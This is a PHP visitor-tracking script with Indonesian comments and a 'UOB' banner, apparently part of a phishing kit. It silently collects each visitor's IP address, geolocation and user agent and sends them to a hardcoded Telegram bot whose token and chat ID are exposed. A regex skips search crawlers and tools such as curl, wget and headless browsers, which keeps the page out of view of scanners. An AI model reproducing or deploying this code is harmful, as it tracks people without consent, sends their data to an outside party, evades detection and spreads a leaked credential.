<?php
// Konfigurasi Bot Telegram (Samakan dengan bot.php)
$botToken = "8966756119:AAFJkGhQ2tfvqkWhgKjt8JzVym1DZTo4mZc"; 
$chatId = "7772104266"; 

function sendMessageVisitor($token, $chat, $text) {
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage";
    $data = [
        'chat_id' => $chat,
        'text' => $text,
        'parse_mode' => 'HTML'
    ];
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($data));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_exec($ch);
    curl_close($ch);
}

function get_client_ip() {
    $ipaddress = '';
    if (isset($_SERVER['HTTP_CLIENT_IP'])) $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if(isset($_SERVER['HTTP_X_FORWARDED_FOR'])) $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if(isset($_SERVER['REMOTE_ADDR'])) $ipaddress = $_SERVER['REMOTE_ADDR'];
    else $ipaddress = 'UNKNOWN';
    return $ipaddress;
}

function get_location($ip) {
    if ($ip == '127.0.0.1' || $ip == '::1' || $ip == 'UNKNOWN') return 'LOCALHOST / UNKNOWN';
    $ctx = stream_context_create(['http' => ['timeout' => 2]]);
    $content = @file_get_contents("http://ip-api.com/json/{$ip}", false, $ctx);
    $details = json_decode($content);
    if ($details && $details->status == 'success') {
        return strtoupper("{$details->city}, {$details->regionName}, {$details->country}");
    }
    return 'LOKASI TIDAK DIKETAHUI';
}

$userAgent = $_SERVER['HTTP_USER_AGENT'];
$ip = get_client_ip();

// Daftar Bot & Crawler Umum untuk diabaikan agar tidak spam
$bot_list = "/bot|crawl|slurp|spider|mediapartners|google|yandex|bing|facebook|twitter|telegram|whatsapp|python|curl|wget|java|php|libwww|httpclient|headless/i";

if (preg_match($bot_list, $userAgent)) {
    // Jika Bot, jangan kirim notif dan jangan blokir (agar SEO tetap jalan jika perlu)
    // Tapi jika Anda ingin memblokir bot sepenuhnya, aktifkan baris di bawah:
    // http_response_code(403); die();
    return; 
}

// Jika Manusia, kirim notifikasi (hanya sekali per session agar tidak spam)
if (session_status() == PHP_SESSION_NONE) {
    session_start();
}

if (!isset($_SESSION['visited'])) {
    $_SESSION['visited'] = true;
    $time = date('d-m-Y H:i:s');
    $location = get_location($ip);
    
    $message = "
━─━────༺𝗨𝗢𝗕༻────━─━
<b>🚀 ADA PENGUNJUNG BARU!</b>
<b>📍 LOKASI :</b> <code>$location</code>
<b>🌐 IP ADDR :</b> <code>$ip</code>
<b>⏰ WAKTU :</b> <code>$time</code>
━─━────༺𝗨𝗢𝗕༻────━─━
<b>🔍 USER AGENT :</b>
<code>$userAgent</code>";
    
    sendMessageVisitor($botToken, $chatId, $message);
}
?>
